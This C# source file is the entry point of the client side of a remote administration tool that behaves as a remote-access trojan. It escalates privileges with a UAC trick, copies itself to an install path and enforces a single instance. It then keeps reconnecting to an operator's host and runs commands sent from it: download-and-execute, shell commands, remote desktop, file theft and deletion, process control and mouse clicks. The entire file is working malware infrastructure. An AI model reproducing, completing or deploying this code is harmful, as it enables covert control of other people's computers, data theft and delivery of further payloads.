﻿using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Core;
using Core.Commands;
using Core.Packets;

namespace Client
{
    internal static class Program
    {
        public static Core.Client _Client;
        private static bool Reconnect = true;
        private static bool Connected = false;
        private static Mutex AppMutex;

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Settings.Initialize();
            Initialize();
            if (!SystemCore.Disconnect)
                Connect();

            //close here
            CommandHandler.CloseShell();
            if (AppMutex != null)
                AppMutex.Close();
        }

        private static void Initialize()
        {
            System.Threading.Thread.Sleep(2000);

            SystemCore.OperatingSystem = SystemCore.GetOperatingSystem();
            SystemCore.MyPath = Application.ExecutablePath;
            SystemCore.InstallPath = Path.Combine(Settings.DIR, Settings.SUBFOLDER + @"\" + Settings.INSTALLNAME);
            SystemCore.AccountType = SystemCore.GetAccountType();
            SystemCore.InitializeGeoIp();

            if (Settings.ENABLEUACESCALATION)
            {
                if (SystemCore.TryUacTrick())
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;
            }

            if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
            {
                if (!SystemCore.CreateMutex(ref AppMutex))
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;

                new Thread(SystemCore.UserIdleThread).Start();

                _Client = new Core.Client(8192);

                _Client.AddTypesToSerializer(typeof (IPacket), new Type[]
                {
                    typeof (Core.Packets.ServerPackets.InitializeCommand),
                    typeof (Core.Packets.ServerPackets.Disconnect),
                    typeof (Core.Packets.ServerPackets.Reconnect),
                    typeof (Core.Packets.ServerPackets.Uninstall),
                    typeof (Core.Packets.ServerPackets.DownloadAndExecute),
                    typeof (Core.Packets.ServerPackets.Desktop),
                    typeof (Core.Packets.ServerPackets.GetProcesses),
                    typeof (Core.Packets.ServerPackets.KillProcess),
                    typeof (Core.Packets.ServerPackets.StartProcess),
                    typeof (Core.Packets.ServerPackets.Drives),
                    typeof (Core.Packets.ServerPackets.Directory),
                    typeof (Core.Packets.ServerPackets.DownloadFile),
                    typeof (Core.Packets.ServerPackets.MouseClick),
                    typeof (Core.Packets.ServerPackets.GetSystemInfo),
                    typeof (Core.Packets.ServerPackets.VisitWebsite),
                    typeof (Core.Packets.ServerPackets.ShowMessageBox),
                    typeof (Core.Packets.ServerPackets.Update),
                    typeof (Core.Packets.ServerPackets.Monitors),
                    typeof (Core.Packets.ServerPackets.ShellCommand),
                    typeof (Core.Packets.ServerPackets.Rename),
                    typeof (Core.Packets.ServerPackets.Delete),
                    typeof (Core.Packets.ServerPackets.Action),
                    typeof (Core.Packets.ClientPackets.Initialize),
                    typeof (Core.Packets.ClientPackets.Status),
                    typeof (Core.Packets.ClientPackets.UserStatus),
                    typeof (Core.Packets.ClientPackets.DesktopResponse),
                    typeof (Core.Packets.ClientPackets.GetProcessesResponse),
                    typeof (Core.Packets.ClientPackets.DrivesResponse),
                    typeof (Core.Packets.ClientPackets.DirectoryResponse),
                    typeof (Core.Packets.ClientPackets.DownloadFileResponse),
                    typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
                    typeof (Core.Packets.ClientPackets.MonitorsResponse),
                    typeof (Core.Packets.ClientPackets.ShellCommandResponse)
                });

                _Client.ClientState += ClientState;
                _Client.ClientRead += ClientRead;
            }
            else
            {
                if (!SystemCore.CreateMutex(ref AppMutex))
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;

                SystemCore.Install();
            }
        }

        private static void Connect()
        {
            TryAgain:
            Thread.Sleep(250 + new Random().Next(0, 250));

            if (!Connected)
                _Client.Connect(Settings.HOST, Settings.PORT);

            Thread.Sleep(200);

            Application.DoEvents();

            HoldOpen:
            while (Connected) // hold client open
            {
                Application.DoEvents();
                Thread.Sleep(2500);
            }

            Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));

            if (SystemCore.Disconnect)
            {
                _Client.Disconnect();
                return;
            }

            if (Reconnect && !SystemCore.Disconnect && !Connected)
                goto TryAgain;
            else
                goto HoldOpen;
        }

        private static void ClientState(Core.Client client, bool connected)
        {
            Connected = connected;

            if (connected && !SystemCore.Disconnect)
                Reconnect = true;
            else if (!connected && SystemCore.Disconnect)
                Reconnect = false;
            else
                Reconnect = !SystemCore.Disconnect;
        }

        private static void ClientRead(Core.Client client, IPacket packet)
        {
            Type type = packet.GetType();

            if (type == typeof (Core.Packets.ServerPackets.InitializeCommand))
            {
                CommandHandler.HandleInitializeCommand((Core.Packets.ServerPackets.InitializeCommand) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.DownloadAndExecute))
            {
                CommandHandler.HandleDownloadAndExecuteCommand((Core.Packets.ServerPackets.DownloadAndExecute) packet,
                    client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Disconnect))
            {
                SystemCore.Disconnect = true;
                client.Disconnect();
            }
            else if (type == typeof (Core.Packets.ServerPackets.Reconnect))
            {
                client.Disconnect();
            }
            else if (type == typeof (Core.Packets.ServerPackets.Uninstall))
            {
                CommandHandler.HandleUninstall((Core.Packets.ServerPackets.Uninstall) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Desktop))
            {
                CommandHandler.HandleRemoteDesktop((Core.Packets.ServerPackets.Desktop) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.GetProcesses))
            {
                CommandHandler.HandleGetProcesses((Core.Packets.ServerPackets.GetProcesses) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.KillProcess))
            {
                CommandHandler.HandleKillProcess((Core.Packets.ServerPackets.KillProcess) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.StartProcess))
            {
                CommandHandler.HandleStartProcess((Core.Packets.ServerPackets.StartProcess) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Drives))
            {
                CommandHandler.HandleDrives((Core.Packets.ServerPackets.Drives) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Directory))
            {
                CommandHandler.HandleDirectory((Core.Packets.ServerPackets.Directory) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.DownloadFile))
            {
                CommandHandler.HandleDownloadFile((Core.Packets.ServerPackets.DownloadFile) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.MouseClick))
            {
                CommandHandler.HandleMouseClick((Core.Packets.ServerPackets.MouseClick) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.GetSystemInfo))
            {
                CommandHandler.HandleGetSystemInfo((Core.Packets.ServerPackets.GetSystemInfo) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.VisitWebsite))
            {
                CommandHandler.HandleVisitWebsite((Core.Packets.ServerPackets.VisitWebsite) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.ShowMessageBox))
            {
                CommandHandler.HandleShowMessageBox((Core.Packets.ServerPackets.ShowMessageBox) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Update))
            {
                CommandHandler.HandleUpdate((Core.Packets.ServerPackets.Update) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Monitors))
            {
                CommandHandler.HandleMonitors((Core.Packets.ServerPackets.Monitors) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.ShellCommand))
            {
                CommandHandler.HandleShellCommand((Core.Packets.ServerPackets.ShellCommand) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Rename))
            {
                CommandHandler.HandleRename((Core.Packets.ServerPackets.Rename) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Delete))
            {
                CommandHandler.HandleDelete((Core.Packets.ServerPackets.Delete) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Action))
            {
                CommandHandler.HandleAction((Core.Packets.ServerPackets.Action) packet, client);
            }
        }
    }
}